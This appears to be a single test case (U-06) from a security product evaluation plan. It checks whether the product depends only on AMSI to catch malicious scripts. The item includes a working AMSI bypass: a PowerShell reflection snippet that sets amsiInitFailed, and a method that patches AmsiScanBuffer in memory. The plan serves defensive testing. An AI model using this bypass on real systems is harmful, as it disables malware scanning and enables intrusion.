# U-06

Test whether the product relies solely on AMSI for script detection.

1. From a standard user PowerShell session, first confirm AMSI is active: run a known-detected string (e.g., `Invoke-Mimikatz` as a string). If the product or Defender blocks it, AMSI is active.
2. Patch `AmsiScanBuffer` in the current process:
   ```powershell
   $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $f = $a.GetField('amsiInitFailed','NonPublic,Static')
   $f.SetValue($null,$true)
   ```
   Or the C equivalent: `VirtualProtect` the first bytes of `AmsiScanBuffer`, overwrite with `mov eax, 0x80070057; ret` (E_INVALIDARG).
3. Re-run the same script. If it now executes and the product log shows nothing, record `miss`.
4. If the product still detects the script (via kernel ETW, minifilter, or behavior monitoring), record `hold`.
5. Close the PowerShell session. The AMSI patch is process-local and does not persist.

Reference: [AMSI bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).
